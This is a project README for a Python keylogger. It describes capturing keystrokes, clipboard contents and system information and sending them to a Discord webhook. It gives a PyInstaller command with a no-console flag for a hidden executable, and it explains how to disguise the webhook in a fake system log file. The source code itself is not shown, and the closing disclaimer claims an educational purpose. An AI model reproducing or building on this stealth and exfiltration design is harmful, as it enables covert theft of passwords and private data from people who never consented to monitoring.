
# 🛡️ Keylogger

A fully featured keylogger written in Python. It captures keystrokes, clipboard changes, and system information, and sends the data securely to a hidden Discord webhook.



## ⚙️ Features

- ⌨️ Logs all keystrokes with modifier support (e.g., `CTRL + C`)
- 📋 Detects clipboard changes and sends content in real time
- 💻 Collects system information (hostname, user, IPs, OS)
- ⏱️ Sends data periodically to a webhook in minute intervals
- 🔒 Uses a disguised log file to hide the webhook URL
- 🚫 Automatically exits if no valid webhook is found
- 🧊 Compatible with both development and compiled environments



## 🔧 Compilation Instructions

To compile the script into a standalone executable using **PyInstaller**:

```bash
pyinstaller --onefile --noconsole --icon="icon_path.ico" keylogger.py
```

Replace `icon_path.ico` with your actual icon file path.  
The `--noconsole` flag ensures no command window pops up when running.

---

## 🔐 Webhook Handling

To protect the Discord webhook URL from being exposed in the source code, the keylogger loads the webhook from a separate file:

```text
systemupdater.log
```

This file is **disguised** to look like a system log. The webhook must appear **alone on a single line**, starting with `http`. The position of the line does not matter.

### ✅ Valid Example (`systemupdater.log`)
```
Initializing update environment...
Checking system consistency...
https://discord.com/api/webhooks/xxxxxxxx/xxxxxxxxxx
Updating cache index references...
```

The file may contain many fake system log lines to disguise its true purpose.

---

## 📁 Project Structure

| File                 | Description                                         |
|----------------------|-----------------------------------------------------|
| `keylogger.py`       | Main Python source code                             |
| `systemupdater.log`  | Contains the Discord webhook URL (camouflaged)      |
| `dist/keylogger.exe` | Final compiled binary using PyInstaller             |

---

## 🚨 Disclaimer

> This software is intended for **educational, research, and ethical testing purposes only**.  
> **Do not** use this tool on systems you do not own or have explicit permission to monitor.  
> Misuse of this software can violate privacy laws and may be considered illegal in many countries.  
> The author takes no responsibility for misuse or damage caused.

---

## 📜 License

This project is released under the **MIT License**.  
See the [LICENSE](./LICENSE) file for more information.

---
